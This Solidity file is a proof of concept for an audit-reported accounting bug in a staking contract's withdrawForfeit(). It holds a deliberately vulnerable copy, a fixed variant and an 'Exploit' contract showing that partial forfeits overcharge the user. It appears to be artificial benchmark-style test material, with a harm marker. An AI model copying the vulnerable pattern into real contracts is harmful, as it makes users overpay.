// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Epoch Island (vEPOCH) H — withdrawForfeit() double-charges reward payback
//  (Quantstamp epoch-island-v-epoch-token, Vepoch.sol).
//
//  withdrawForfeit(_depositId, percentage) computes the rewardToken a user must
//  pay back to unlock `percentage` of a deposit as:
//
//      forfeitReward = ((earned + rewardTokensClaimed) * percentage) / 1e18
//
//  It pulls `forfeitReward` rewardToken from the user and reduces the deposit's
//  staked amount by `percentage`, but NEVER reduces the stored
//  `rewardTokensClaimed`. So a user who forfeits in several PARTIAL steps keeps
//  paying against the FULL, un-decremented `rewardTokensClaimed` base each time
//  and repays strictly MORE rewardToken than a single full forfeit would cost.
//
//  The forfeitReward line is reproduced VERBATIM (marked @>). The Vepoch deposit
//  book, the rewardToken, and a marker token are faithful minimal doubles.
//  Local deploy, no fork, no cheatcodes.
//
//  Scenario: one deposit with staked = 100e18, earned = 0, rewardTokensClaimed
//  = 100e18. A single full forfeit (percentage = 1e18) costs 100e18 rewardToken.
//  Forfeiting the same deposit in two steps (50% then the remaining 100%) costs
//  50e18 + 100e18 = 150e18 — an excess of 50e18 rewardToken over-paid into the
//  contract. The excess is minted to SINK as the harm marker.
// =============================================================================

contract MiniToken {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// Faithful minimal double of the vulnerable Vepoch deposit book.
contract Vepoch {
    MiniToken public rewardToken;

    // Per-deposit accounting (mirrors Vepoch.sol storage).
    mapping(uint256 => uint256) public staked; // EPOCH staked per deposit
    mapping(uint256 => uint256) public earned; // pending earned rewardToken
    mapping(uint256 => uint256) public rewardTokensClaimed; // rewardToken already claimed

    uint256 public totalForfeitPaid; // instrumentation: total rewardToken pulled

    constructor(MiniToken _rewardToken) {
        rewardToken = _rewardToken;
    }

    // Test-harness seeding of a single deposit's state.
    function seedDeposit(uint256 _depositId, uint256 stakedAmt, uint256 earnedAmt, uint256 claimed) external {
        staked[_depositId] = stakedAmt;
        earned[_depositId] = earnedAmt;
        rewardTokensClaimed[_depositId] = claimed;
    }

    // VERBATIM vulnerable path from Vepoch.sol::withdrawForfeit().
    function withdrawForfeit(uint256 _depositId, uint256 percentage) external {
        uint256 forfeitReward = ((earned[_depositId] + rewardTokensClaimed[_depositId]) * percentage) / 1e18; // @>
        rewardToken.transferFrom(msg.sender, address(this), forfeitReward);
        totalForfeitPaid += forfeitReward;

        // Unlock `percentage` of the still-locked staked EPOCH.
        uint256 unlocked = (staked[_depositId] * percentage) / 1e18;
        staked[_depositId] -= unlocked;
        // BUG: rewardTokensClaimed[_depositId] is never scaled down here, so the
        // next partial forfeit re-charges against the full original base.
    }
}

// Fixed variant: scale the reward base by `percentage` on every forfeit.
contract VepochFixed {
    MiniToken public rewardToken;

    mapping(uint256 => uint256) public staked;
    mapping(uint256 => uint256) public earned;
    mapping(uint256 => uint256) public rewardTokensClaimed;

    uint256 public totalForfeitPaid;

    constructor(MiniToken _rewardToken) {
        rewardToken = _rewardToken;
    }

    function seedDeposit(uint256 _depositId, uint256 stakedAmt, uint256 earnedAmt, uint256 claimed) external {
        staked[_depositId] = stakedAmt;
        earned[_depositId] = earnedAmt;
        rewardTokensClaimed[_depositId] = claimed;
    }

    function withdrawForfeit(uint256 _depositId, uint256 percentage) external {
        uint256 forfeitReward = ((earned[_depositId] + rewardTokensClaimed[_depositId]) * percentage) / 1e18;
        rewardToken.transferFrom(msg.sender, address(this), forfeitReward);
        totalForfeitPaid += forfeitReward;

        uint256 unlocked = (staked[_depositId] * percentage) / 1e18;
        staked[_depositId] -= unlocked;

        // FIX: reduce the owed-reward base proportionally to what was forfeited.
        earned[_depositId] -= (earned[_depositId] * percentage) / 1e18;
        rewardTokensClaimed[_depositId] -= (rewardTokensClaimed[_depositId] * percentage) / 1e18;
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 public constant DEPOSIT_ID = 1;
    uint256 public constant STAKED = 100e18;
    uint256 public constant CLAIMED = 100e18; // rewardTokensClaimed for the deposit

    uint256 public fairPaid; // cost of a single full forfeit
    uint256 public totalPaidMultiStep; // cost paid across the partial forfeits
    uint256 public excess; // over-payment = harm

    MiniToken public rewardToken;
    Vepoch public vepoch;
    MiniToken public marker;

    function run() external payable {
        // Fixed, unconditional creation order (nonce 1, 2, 3).
        rewardToken = new MiniToken("EPOCH-RWD");
        vepoch = new Vepoch(rewardToken);
        marker = new MiniToken("HARM");

        // A single full forfeit would cost exactly (earned + claimed) = CLAIMED.
        fairPaid = CLAIMED;

        // This contract acts as the depositing user. Fund it and approve.
        rewardToken.mint(address(this), 200e18);
        rewardToken.approve(address(vepoch), type(uint256).max);

        // Seed the deposit: 100 EPOCH staked, 0 earned, 100 rewardTokensClaimed.
        vepoch.seedDeposit(DEPOSIT_ID, STAKED, 0, CLAIMED);

        // Forfeit in two partial steps instead of one full step.
        vepoch.withdrawForfeit(DEPOSIT_ID, 0.5e18); // 50%  -> charges 100*0.5 = 50e18
        vepoch.withdrawForfeit(DEPOSIT_ID, 1e18); //   100% -> charges 100*1.0 = 100e18 (bug)

        totalPaidMultiStep = vepoch.totalForfeitPaid();
        excess = totalPaidMultiStep - fairPaid;

        // Record the concrete harm: rewardToken over-paid into the contract.
        marker.mint(SINK, excess);
    }
}
